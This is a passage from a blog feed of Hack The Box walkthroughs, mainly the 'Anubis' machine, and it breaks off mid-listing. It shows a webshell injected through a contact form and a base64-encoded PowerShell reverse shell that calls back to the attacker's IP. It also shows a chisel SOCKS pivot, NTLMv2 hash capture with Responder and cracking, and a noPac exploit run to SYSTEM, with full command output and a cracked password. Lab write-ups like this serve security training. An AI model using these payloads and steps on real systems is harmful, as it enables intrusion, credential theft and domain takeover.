                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'ps aux'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'df'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'ss -lnt'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Bye</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
                <span class="k">break</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="n">pdb</span><span class="p">.</span><span class="n">post_mortem</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">__traceback__</span><span class="p">)</span>
<span class="k">finally</span><span class="p">:</span>
    <span class="n">quit</span><span class="p">()</span></code></pre></figure>

<figure>
<img src="/assets/img/forge/root.png" alt="Root" />
<figcaption> Root </figcaption>
</figure>]]></content><author><name>zexionx00</name><email>zexionx00@gmail.com</email></author><category term="HTB" /><summary type="html"><![CDATA[An medium rated machine from Hack The Box]]></summary></entry><entry><title type="html">Anubis - Hack The Box</title><link href="http://localhost:4000/Anubis/" rel="alternate" type="text/html" title="Anubis - Hack The Box" /><published>2021-08-15T01:00:07+01:00</published><updated>2021-08-15T01:00:07+01:00</updated><id>http://localhost:4000/Anubis</id><content type="html" xml:base="http://localhost:4000/Anubis/"><![CDATA[<figure>
<img src="/assets/img/anubis/anubis.png" alt="anubis" />
<figcaption> Anubis - Hack The Box </figcaption>
</figure>

<h1 id="introduction">Introduction</h1>

<p><a href="https://www.hackthebox.com/home/machines/profile/371" target="_blank" rel="noopener nofollow">Anubis</a> is insane rated machine from Hack The Box which includes Docker Escape in windows, unintended path of <a href="https://github.com/Ridter/noPac" target="_blank" rel="noopener nofollow">noPAC</a>. And finally, intended path of abusing <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noopener nofollow">ADCS</a>.</p>

<h1 id="nmap">Nmap</h1>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Nmap 7.91 scan initiated Sat Jan 29 21:44:35 2022 as: nmap -sC -sV -vv -oA nmap/ports 10.10.11.102</span>
Nmap scan report <span class="k">for </span>10.10.11.102
Host is up, received echo-reply ttl 127 <span class="o">(</span>0.37s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2022-01-29 21:44:36 EST <span class="k">for </span>138s
Not shown: 996 filtered ports
Reason: 996 no-responses
PORT    STATE SERVICE       REASON          VERSION
135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
443/tcp open  ssl/http      syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>www.windcorp.htb
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-24T19:44:56
| Not valid after:  2031-05-24T19:54:56
| MD5:   e2e7 86ef 4095 9908 14c5 3347 cdcb 4167
| SHA-1: 7fce 781f 883c a27e 1154 4502 1686 ee65 7551 0e2a
| <span class="nt">-----BEGIN</span> CERTIFICATE-----
| MIIDLTCCAhWgAwIBAgIQGTQcHTu8XrtFZ6hwEkAoKTANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDDBB3d3cud2luZGNvcnAuaHRiMB4XDTIxMDUyNDE5NDQ1NloXDTMx
| MDUyNDE5NTQ1NlowGzEZMBcGA1UEAwwQd3d3LndpbmRjb3JwLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAK79Y9DwPj7s4/vGfCx8Smiq921EsKI9
| UQLB6ctOlXifp+YGwRKmDjPiRBsRaBcrQJyW8B3s8NKU1mt8dIX0bbn6gqBezeXg
| cu+VXV/5HJmVQ5jxNe02NoY1l+5UBvmfpwRJmUvW+mO5dShhilDsNjPYYhydbme9
| ap6UeFG7zwHfDKywUAFonbyxZcmFvaWUbbswNh0Hc0l7qAIddU8+O4azNNLzBgot
| dstmd5PXMXtX4bdvupAV+PIhsu8ddsbSFAKxh7GLnmNDUv0/Jy1IQRfvpnjFNWAL
| oeQzNmNnzCTNgoB9V7eAnPXCOLulq2geCaJ19WlYRrMc+lzIR/C4wB0CAwEAAaNt
| MGswDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAbBgNVHREEFDASghB3d3cud2luZGNvcnAuaHRiMB0GA1UdDgQWBBQu0cbQ/zqK
| aIeIy021WpVKOzBX8TANBgkqhkiG9w0BAQsFAAOCAQEAiyR1RyIWHuLR17cb45U+
| 3rmflhQozUfNm1QMTGXQerX1s5p+Uw0rh7OdJe4VTE7smVPHiFJYzMlrvxl3p6Ur
| UREF7ymW6NkriFZFSFKswHlWR9o5UwNG2QUAN8VjHBuOZT1LP8vgxRT290xh9G2w
| i3Y3R5WA5FLYPYbNBJ7FZUbdMUkvQZI2DL9bd3ZLptqqlk/62kDrIRN2ctq8R6+c
| C+h4MLd5L8Eoftf+5r1SrxTg3cD7ex2bm5cZmLhmtEYA6L1RkUPuf132Fb98URSE
| +heFt1xpfM/EREhI+iwhFhTsDydrebtm9/HlxmDhd8OJqsFXmPWd6cw/llxONk9c
| <span class="nv">bA</span><span class="o">==</span>
|_-----END CERTIFICATE-----
|_ssl-date: 2022-01-30T02:46:47+00:00<span class="p">;</span> +1s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp open  microsoft-ds? syn-ack ttl 127
593/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking <span class="k">for </span>Conficker.C or higher...
|   Check 1 <span class="o">(</span>port 17975/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 2 <span class="o">(</span>port 29705/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 3 <span class="o">(</span>port 30756/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|   Check 4 <span class="o">(</span>port 19663/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   <span class="nb">date</span>: 2022-01-30T02:45:36
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sat Jan 29 21:46:54 2022 -- 1 IP address (1 host up) scanned in 139.41 seconds</span></code></pre></figure>

<p>Nmap leaks the hostname www.windcorp.htb. So, we add it to our hosts file and move on.</p>

<h1 id="web">Web</h1>

<p>Everything looks fine but the contact form doesn’t. When we submit a contact request, its actually reflecting our request to /preview.asp which is often vulnerable to SSTI, Template Injection, XSS. And since this is running asp, upon sending a asp webshell, we get a hit here.</p>

<figure>
<img src="/assets/img/anubis/check.png" alt="Reflect" />
<figcaption> Request Reflect </figcaption>
</figure>

<p>And <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp" target="_blank" rel="noopener nofollow">Cmd WebShell</a></p>

<figure>
<img src="/assets/img/anubis/cmd.png" alt="cmd" />
<figcaption> CMD ASPSHELL </figcaption>
</figure>

<h1 id="reverse-shell">Reverse Shell</h1>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% <span class="nb">cat </span>shell.ps1 | iconv <span class="nt">-t</span> utf-16le | <span class="nb">base64</span> <span class="nt">-w</span> 0<span class="p">;</span> <span class="nb">echo
</span><span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA0ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% rlwrap nc <span class="nt">-lvnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
connect to <span class="o">[</span>10.10.14.54] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.102] 49901
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem
PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; </code></pre></figure>

<p>But we are not done with the box. We have a shell as Administrator in a container. We can verify that with its IP.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop&gt; ipconfig
Windows IP Configuration


Ethernet adapter vEthernet <span class="o">(</span>Ethernet<span class="o">)</span>:

   Connection-specific DNS Suffix  <span class="nb">.</span> : htb
   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::bc0e:be96:fb13:edc4%32
   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 172.20.62.109
   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.240.0
   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 172.20.48.1 </code></pre></figure>

<p>After some enums on the machine, we get a req.txt in Administrator’s desktop which is a certificate that can be decoded with opennsl. We get a FQDN softwareportal.windcorp.htb . So, we add the gateway with our FQDN. But we cannot access the endpoint without any proxy. So, lets start a chisel server.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">openssl req <span class="nt">-in</span> req.txt <span class="nt">-text</span>
Certificate Request:
    Data:
        Version: 1 <span class="o">(</span>0x0<span class="o">)</span>
        Subject: C <span class="o">=</span> AU, ST <span class="o">=</span> Some-State, O <span class="o">=</span> WindCorp, CN <span class="o">=</span> softwareportal.windcorp.htb
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: <span class="o">(</span>2048 bit<span class="o">)</span>
                Modulus:
                    00:a6:9b:4a:ff:85:91:c2:2a:c2:bf:04:3e:ce:15:
                    d2:f6:23:db:c5:f2:82:1e:6a:13:12:f4:b6:fd:b1:
                    32:44:14:24:c7:1b:10:9d:85:15:fe:c6:d8:ac:44:
                    1b:c0:00:51:0e:b8:f5:14:05:62:9b:04:41:c8:1f:
                    66:e1:18:47:c2:7a:78:48:2e:5f:fd:45:10:ae:00:
                    a2:f4:8a:e8:f6:9d:02:ab:1d:0d:43:cc:31:15:b8:
                    89:19:9d:36:a4:8f:70:3e:02:1b:d3:3e:7b:4b:78:
                    48:0d:7f:99:77:dd:c6:ce:70:72:05:9b:70:bd:db:
                    f7:1f:d8:8b:e3:1e:16:89:59:bf:b8:6b:fe:8f:81:
                    39:5c:c4:13:27:7b:93:ac:47:ee:21:73:86:08:84:
                    b9:f3:40:ca:15:52:ac:bb:c0:8d:d5:67:6b:63:4a:
                    1e:92:8a:23:d4:e3:e5:60:fe:7b:f1:ff:f6:0d:c8:
                    46:ac:de:68:c0:fc:34:99:89:cc:ec:a8:3b:c2:34:
                    <span class="nb">cd</span>:b8:61:93:aa:aa:65:48:c6:59:90:08:02:b8:5a:
                    ca:3b:1c:cc:21:68:a9:6e:7b:77:2e:dc:fa:45:3a:
                    ff:88:27:d6:a5:b0:d5:ad:f3:17:53:b5:51:22:a4:
                    26:70:59:13:c5:bc:61:6e:d7:1e:79:4a:fb:38:d4:
                    a7:77
                Exponent: 65537 <span class="o">(</span>0x10001<span class="o">)</span>
        Attributes:
            a0:00
    Signature Algorithm: sha256WithRSAEncryption
         6b:ac:75:c1:11:97:70:30:62:4c:0f:87:27:33:07:96:36:9b:
         63:91:72:c9:3a:0b:50:30:09:23:5e:f3:24:bc:46:81:51:54:
         79:5c:5d:61:ed:1b:af:d2:fd:d6:2b:3b:9a:e8:50:f1:2f:6c:
         d8:ac:b5:8b:2d:8f:59:6e:63:8a:de:cc:70:f6:7a:f0:da:e6:
         6d:8c:25:bc:d5:ac:17:ba:5c:67:b2:d8:54:6d:b8:57:9e:ec:
         21:d1:7f:33:3a:11:dc:3a:6a:3b:94:ff:0e:6f:60:37:23:ad:
         c8:a4:27:9a:13:08:a3:8d:65:d5:fd:9c:7c:57:dc:a8:c8:e9:
         5d:cc:1a:1e:2c:7b:6c:29:71:56:86:d6:a2:59:79:bf:6f:b8:
         5f:04:cf:69:a3:45:86:d6:f2:f0:0d:45:17:4f:4d:0d:2a:7c:
         67:c2:4c:c9:51:91:c7:61:6f:1a:b2:77:f6:f2:2b:8e:53:0c:
         28:58:fa:33:71:80:99:db:c7:f8:83:bf:0f:90:7a:24:21:04:
         <span class="nb">dd</span>:a9:ae:c5:4d:38:08:81:f0:08:8e:42:d3:84:f6:29:a0:8d:
         e1:4e:b5:d7:63:c3:21:2d:2d:3a:e6:41:8f:c8:1d:60:8b:20:
         05:8b:05:0d:e0:ed:a7:6d:e0:e0:9b:11:e9:2a:2c:12:2b:28:
         e1:39:70:a5
<span class="nt">-----BEGIN</span> CERTIFICATE REQUEST-----
MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
<span class="nv">4TlwpQ</span><span class="o">==</span>
<span class="nt">-----END</span> CERTIFICATE REQUEST-----</code></pre></figure>

<p>VM,</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% ./chisel.elf server <span class="nt">-p</span> 8000 <span class="nt">--reverse</span>
2022/01/29 22:19:37 server: Reverse tunnelling enabled
2022/01/29 22:19:37 server: Fingerprint <span class="nv">U0rSx35TiFy2cgvz2lvetA6pPiCzOeEQ9uamyz2OHS0</span><span class="o">=</span>
2022/01/29 22:19:37 server: Listening on http://0.0.0.0:8000
2022/01/29 22:20:05 server: session#1: tun: proxy#R:127.0.0.1:1080<span class="o">=&gt;</span>socks: Listening</code></pre></figure>

<p>Server,</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">.<span class="se">\c</span>hisel.exe client 10.10.14.54:8000 R:socks</code></pre></figure>

<p>You might just add it to your proxychains.conf, but since I will be doing this in firefox, I just going to add the FQDN to my hosts file, and then change the firefox’s proxy to go through socks5 proxy here.</p>

<figure>
<img src="/assets/img/anubis/sock.png" alt="Proxy" />
<figcaption> Proxy through firefox </figcaption>
</figure>

<p>And now we get a page. There are Our Software index, which has goes to install.asp, but also the IP of the machine. So, if we change the IP to our box, and try to capture the hash, it’d be great. And we do so, and indeed get a hit as localadmin with NTLM hash. After cracking we find out it works for SMB.</p>

<figure>
<img src="/assets/img/anubis/fqdn.png" alt="Webpage" />
<figcaption> Softwares </figcaption>
</figure>

<p>Responder,</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+] Current Session Variables:                 
    Responder Machine Name     <span class="o">[</span>WIN-4CDJGCYRAKD]
    Responder Domain Name      <span class="o">[</span>1KWR.LOCAL]
    Responder DCE-RPC Port     <span class="o">[</span>46662]
                                                                                               
<span class="o">[</span>+] Listening <span class="k">for </span>events...                
                                               
<span class="o">[</span>WinRM] NTLMv2 Client   : 10.10.11.102
<span class="o">[</span>WinRM] NTLMv2 Username : windcorp<span class="se">\l</span>ocaladmin
<span class="o">[</span>WinRM] NTLMv2 Hash     : localadmin::windcorp:6fb6994acf69cc7a:6DADA07DAC31D5FDF40DE78B2E3F3F0C:0101000000000000578C51DF8C15D801FE0E53FF2B7CCD3A000000000200080031004B005700520001001E0057004
9004E002D003400430044004A00470043005900520041004B0044000400140031004B00570052002E004C004F00430041004C0003003400570049004E002D003400430044004A00470043005900520041004B0044002E0031004B005700520
02E004C004F00430041004C000500140031004B00570052002E004C004F00430041004C0008003000300000000000000000000000002100002173FE7CFB71082C80F6EEEB287AF563F563DE9B7E2FC3B377A156F2A076C6340A00100000000
0000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00350034000000000000000000</code></pre></figure>

<p>Request,</p>

<figure>
<img src="/assets/img/anubis/install.png" alt="Request" />
<figcaption> Request to our server </figcaption>
</figure>

<h1 id="smb">SMB</h1>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash 
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Secret123        <span class="o">(</span>localadmin<span class="o">)</span>
1g 0:00:00:03 DONE <span class="o">(</span>2022-01-29 22:55<span class="o">)</span> 0.3012g/s 630438p/s 630438c/s 630438C/s Smudge2..SaS1993
Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
Session completed

% smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.10.11.102 <span class="nt">-U</span> localadmin
Enter WORKGROUP<span class="se">\l</span>ocaladmin<span class="s1">'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available</span></code></pre></figure>

<h1 id="root">Root</h1>

<p>But here for the noPac exploit running, we need to add the proxychains. So, let’s do it. Since, we already have a socks5 proxy running, let’s just add it to config file.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% <span class="nb">echo</span> <span class="s2">"socks5 127.0.0.1 1080"</span> <span class="o">&gt;&gt;</span> /etc/proxychains.conf</code></pre></figure>

<p>And we have shell as NT Authority\SYSTEM in the box.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">% <span class="nb">sudo </span>proxychains <span class="nt">-q</span> python3 /opt/noPac/noPac.py windcorp.htb/localadmin:<span class="s1">'Secret123'</span> <span class="nt">-dc-ip</span> 172.20.48.1 <span class="nt">-dc-host</span> EARTH <span class="nt">-shell</span> <span class="nt">--impersonate</span> administrator

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                        
    
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Current ms-DS-MachineAccountQuota <span class="o">=</span> 10
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Selected Target EARTH.windcorp.htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> will try to impersonat administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding Computer Account <span class="s2">"WIN-XN9RQWTQB0I"</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> MachineAccount <span class="s2">"WIN-XN9RQWTQB0I"</span> password <span class="o">=</span> <span class="o">!</span>C<span class="k">*</span>@LHvRRNf%
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully added machine account WIN-XN9RQWTQB0I with password <span class="o">!</span>C<span class="k">*</span>@LHvRRNf%.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> WIN-XN9RQWTQB0I object <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>WIN-XN9RQWTQB0I,CN<span class="o">=</span>Computers,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> WIN-XN9RQWTQB0I sAMAccountName <span class="o">==</span> EARTH
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>EARTH.ccache
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Resting the machine account to WIN-XN9RQWTQB0I
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restored WIN-XN9RQWTQB0I sAMAccountName to original value
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using TGT from cache
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span>     Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>administrator.ccache
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remove ccache of EARTH.windcorp.htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Rename ccache with target ...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to del a computer with the name: WIN-XN9RQWTQB0I
<span class="o">[</span>-] Delete computer WIN-XN9RQWTQB0I Failed! Maybe the current user does not have permission.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Pls make sure your choice <span class="nb">hostname </span>and the <span class="nt">-dc-ip</span> are same machine <span class="o">!!</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploiting..
<span class="o">[!]</span> Launching semi-interactive shell - Careful what you execute
C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type <span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop<span class="se">\r</span>oot.txt
9851b59ec4a8a85d93a15d3a07732978

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;</code></pre></figure>

<p>Note: You can get the hostname of the server with crackmapexec.</p>

<h1 id="intended-path">Intended Path</h1>

<p>The above POC we used was unintended path to root. The intended was to abuse ADCS and get NTLM hash of Administrator. But first, we need to get a shell in the system. So, we’ll continue from <a href="#smb">SMB</a>.</p>

<p>Checking the Shared share of machine, we get two folders, software with some softwares and Documents with .omv files. So, since the Jamovi is running on server, can confirmed with installed in softwares and .omv is also Jamovi’s extension. There is exploit in Jamovi which can lead us to RCE. So, let’s change the name field in one of the files inside Analytics. Will try to request a shell.js which just gives back a reverse shell.</p>

<p>Softwares,</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Wed Apr 28 11:06:06 2021
  ..                                  D        0  Wed Apr 28 11:06:06 2021
  Documents                           D        0  Tue Apr 27 00:09:25 2021
  Software                            D        0  Thu Jul 22 14:14:16 2021

                9034239 blocks of size 4096. 2993905 blocks available
smb: <span class="se">\&gt;</span> <span class="nb">cd </span>Software<span class="se">\</span>
smb: <span class="se">\S</span>oftware<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Thu Jul 22 14:14:16 2021
  ..                                  D        0  Thu Jul 22 14:14:16 2021
  7z1900-x64.exe                      N  1447178  Mon Apr 26 17:10:08 2021
  jamovi-1.6.16.0-win64.exe           N 247215343  Mon Apr 26 17:03:30 2021
  VNC-Viewer-6.20.529-Windows.exe      N 10559784  Mon Apr 26 17:09:53 2021

                9034239 blocks of size 4096. 2993905 blocks available
smb: <span class="se">\S</span>oftware<span class="se">\&gt;</span> </code></pre></figure>

<p>OMV Files,</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">smbclient <span class="se">\\\\</span>10.10.11.102<span class="se">\\</span>Shared <span class="nt">-U</span> localadmin
Enter WORKGROUP<span class="se">\l</span>ocaladmin<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Wed Apr 28 11:06:06 2021
  ..                                  D        0  Wed Apr 28 11:06:06 2021
  Documents                           D        0  Tue Apr 27 00:09:25 2021
  Software                            D        0  Thu Jul 22 14:14:16 2021

                9034239 blocks of size 4096. 2998668 blocks available
smb: \&gt; cd Documents\
ls
smb: \Documents\&gt; ls
  .                                   D        0  Tue Apr 27 00:09:25 2021
  ..                                  D        0  Tue Apr 27 00:09:25 2021
  Analytics                           D        0  Tue Apr 27 14:40:20 2021

                9034239 blocks of size 4096. 2998668 blocks available
smb: \Documents\&gt; cd Analytics\
smb: \Documents\Analytics\&gt; ls
